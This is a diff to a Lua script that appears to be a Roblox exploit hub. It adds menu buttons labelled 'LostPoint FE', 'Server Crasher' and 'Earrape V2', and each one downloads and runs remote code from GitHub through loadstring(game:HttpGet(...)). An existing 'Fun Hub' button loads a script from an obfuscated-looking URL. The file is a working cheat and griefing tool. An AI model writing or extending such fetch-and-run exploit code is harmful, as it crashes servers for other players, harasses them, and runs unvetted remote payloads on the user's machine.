@@ -121,7 +121,10 @@ end)
 b:Button("Fun Hub", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/jfnasdoijfo239092jsj/-TJ-O-GIH-EOINDKLGN-OIO-JG-IEOGJE-GJ-EGJ-GJ-EOIOGJ-EGEJ-JGIDGJKLZJEFW-F-T-D-R-/main/lastloadergithub!GLK%7B!%23LL%23%7B!%40L%7B!%23KPG%7B!%23LPG!%23%7BK%7BPKL%7BFL!%40%7B%23G%7BOPAPG%7BSH(%40G.lua", true))()
 end)
- 
+
+b:Button("LostPoint FE", function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/JunglePush/LostPoint/main/LostPointScript"))()
+end)
  
 local b = w:CreateFolder("Memes",{
     TextSize = 25;
@@ -352,14 +355,14 @@ b:Button("CU Hub", function()
 end)
 
 
-local b = w:CreateFolder("Placeholder",{
+local b = w:CreateFolder("Da Hood",{
     TextSize = 25;
     TextColor = Color3.fromRGB(255,255,255);
     BgColor = Color3.fromRGB(0,0,0);
 })
 
-b:Button("Placeholder", function()
-        loadstring(game:HttpGet(""))()
+b:Button("Server Crasher", function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 end)
 
 
@@ -422,6 +425,10 @@ end)
 
 b:Button("Hitbox Extender", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Coldlolololir/bfdzhuiasbghjdlbgjhlas/main/heu.lua"))()
+end)
+
+b:Button("Earrape V2", function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/fheahdythdr/miniature-tribble/main/Earrape.lua"))()
 end)
 
 game:GetService("StarterGui"):SetCore("SendNotification", {
